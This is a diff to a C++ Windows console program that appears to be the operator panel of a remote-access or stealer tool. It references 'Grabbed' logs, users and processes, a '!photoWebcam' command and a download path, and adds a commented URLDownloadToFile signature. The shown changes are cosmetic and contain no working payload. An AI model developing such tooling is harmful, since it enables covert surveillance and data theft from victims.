@@ -1,9 +1,12 @@
-﻿#include <iostream>
+﻿
+#include <iostream>
 #include <Windows.h>
 #include <fstream>
 #include <string>
 
+
 using namespace std;
+
 
 
 
@@ -48,6 +51,10 @@ int main()
 	string logs = "Modules\\Grabbed\\logs.txt";
 	//string user = "Modules\\Grabbed\\users.txt";
 	//string prefrences = "Modules\\Preferences\\ports.txt";
+	string dll1 = "Modules\\dlls\\libstdc++-6.dll";
+	string dll4 = "Modules\\dlls\\ucrtbased.dll";
+	string dll2 = "Modules\\dlls\\msvcp140d.dll";
+	string dll3 = "Modules\\dlls\\vcruntime140d.dll";
 	SetConsoleCP(1251);
 	SetConsoleOutputCP(1251);
 
@@ -148,9 +155,9 @@ int main()
 	
 }
 
-
 void Help(string path) 
 {
+
 	col = 8;
 	SetConsoleTextAttribute(hConsole, col);
 	cout << "\n\n";
@@ -1332,8 +1339,15 @@ void Choose(string logo, int choose)
 	system("cls");
 	string user = "Modules\\Grabbed\\users.txt";
 	string proc = "Modules\\Grabbed\\processes.txt";
-	
+	string path = "";
 	string comands_session = "Modules\\Commands\\Session.txt";
+	col = 8;
+	SetConsoleTextAttribute(hConsole, col);
+	printf("Enter the path for downloading files: ");
+	col = 11;
+	SetConsoleTextAttribute(hConsole, col);
+	cin >> path;
+	system("cls");
 	while (true)
 	{
 		if (logoShow)
@@ -1386,6 +1400,8 @@ void Choose(string logo, int choose)
 			}
 			file.close();
 			line = "";
+			col = 9;
+			SetConsoleTextAttribute(hConsole, col);
 			printf("Hi %s!!!\n   !help ==for==> command list\n", curentUSER.c_str());
 		}
 		col = 6;
@@ -1398,6 +1414,7 @@ void Choose(string logo, int choose)
 		if (command == "!help")
 		{
 			Help(comands_session);
+
 		}
 		if (command == "!menu")
 		{
@@ -1448,7 +1465,13 @@ void Choose(string logo, int choose)
 			SetConsoleTextAttribute(hConsole, col);
 			printf("Fatal ERROR!!!\n");
 			cout << "\n\n";
-
+			//HRESULT URLDownloadToFile(
+			//	LPUNKNOWN            pCaller,
+			//	LPCTSTR              szURL,
+			//	LPCTSTR              szFileName,
+			//	_Reserved_ DWORD                dwReserved,
+			//	LPBINDSTATUSCALLBACK lpfnCB
+			//);
 
 		}
 		if (command == "!photoWebcam")
